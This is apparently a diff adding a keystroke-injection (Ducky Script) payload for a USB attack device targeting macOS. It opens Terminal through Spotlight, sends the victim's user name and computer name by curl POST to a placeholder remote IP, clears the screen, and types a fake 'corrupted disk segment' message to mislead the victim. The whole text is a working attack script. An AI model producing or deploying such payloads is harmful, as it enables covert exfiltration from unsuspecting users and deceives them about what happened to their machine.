@@ -1,0 +1,15 @@
+DELAY 1000
+GUI SPACE
+DELAY 300
+STRING Terminal
+DELAY 300
+ENTER
+DELAY 750
+STRING curl -d "User: $USER----Computer: $HOSTNAME" -X POST --ssl-reqd <remoteIp>
+DELAY 500
+ENTER
+DELAY 250
+STRING clear
+ENTER 
+DELAY 250 
+STRING This disk has a corrupted segment. Please contact manufacturer for further instruction.
